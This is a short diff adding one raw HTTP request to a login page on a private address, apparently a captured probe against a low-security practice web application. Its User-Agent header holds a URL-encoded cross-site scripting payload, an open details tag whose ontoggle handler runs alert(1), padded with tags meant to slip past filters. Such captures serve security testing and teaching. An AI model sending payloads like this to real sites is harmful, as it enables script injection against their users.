@@ -1,0 +1,8 @@
+GET /login.php HTTP/1.1
+Host: 10.20.186.207:1111
+User-Agent: %3Cform%2F%3E%3C%21%3E%3Cdetails%2Fopen%2Fontoggle%3Dalert%281%29%3E%22%0A%40gmail%0A.com
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Cookie: PHPSESSID=qpfq4fvllcm4ai64gjsj6cvp57; security=low
+
